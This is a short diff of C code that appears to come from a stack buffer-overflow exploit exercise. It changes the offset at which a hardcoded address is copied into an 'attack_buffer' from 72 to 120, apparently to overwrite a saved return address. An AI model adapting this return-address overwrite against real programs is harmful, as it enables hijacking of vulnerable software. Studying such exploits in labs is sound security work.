@@ -38,8 +38,8 @@ main ( int argc, char * argv[] )
 
 	char *ptr = (char*)0x2021feb0;
 
-	for(int i=0;i<6;i++){
-    	*(attack_buffer+72+i) = ptr[i];
+	for (int i = 0; i < 6; i++){
+    	*(attack_buffer + 120 + i) = ptr[i];
 }
 
 	printf("hex: %x\n",attack_buffer[BUF_TO_RET]);
